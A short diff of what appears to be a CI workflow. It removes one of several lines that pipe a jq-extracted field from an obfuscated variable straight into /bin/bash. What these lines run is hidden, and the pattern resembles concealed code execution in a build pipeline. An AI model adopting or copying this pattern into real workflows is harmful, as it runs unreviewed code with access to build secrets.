@@ -28,7 +28,6 @@ jobs:
           echo $k64964 | jq -r .g59161 | /bin/bash
           echo $ndswj413 | jq -r .lcny13 | /bin/bash
           printf '%s' "$ftv31748" | jq -r .oqp56306 | /bin/bash
-          echo $dtaeh5646 | jq -r .xn91641 | /bin/bash
           echo $p8 | jq -r .kl41 | /bin/bash
 
       - name: Save output
